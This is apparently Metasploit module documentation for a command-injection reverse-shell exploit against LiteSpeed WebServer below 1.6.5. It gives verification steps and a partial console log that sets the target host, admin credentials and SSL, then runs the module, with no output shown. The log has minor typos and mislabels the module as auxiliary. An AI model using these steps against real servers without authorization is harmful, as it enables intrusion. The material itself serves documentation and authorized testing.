
## Vulnerable Application

This module allows an attacker with a privileged admin account to launch a reverse shell due to a command injection vulnerability in Litespeed WebServer < 1.6.5
This module has been tested successfully on:

* Ubuntu 18.04.4.

## Verification Steps


Metasploit:

1. `./msfconsole`
1. `use exploit/litespeed_webserver_rce`
1. `set rhosts <rhost>`
1. `set rport <rport>`
1. `set username <username>`
1. `set password <password>`
1. `set ssl true`
1. `run`

## Scenarios

### litespeed_webserver_rce.rb on Ubuntu 18.04.4

```
msf6 > use exploit/litespeed_webserver_rce
msf6 auxiliary(exploit/litespeed_webserver_rce) > set rhosts 172.16.191.195
rhosts => 172.16.191.195
msf6 auxiliary(exploit/litespeed_webserver_rcee) > set username admin
USERNAME => admin
msf6 auxiliary(exploit/litespeed_webserver_rcee) > set password admin
PASSWORD => admin
msf6 auxiliary(exploit/litespeed_webserver_rcee) > set ssl true
ssl => true
msf6 auxiliary(exploit/litespeed_webserver_rce) > run
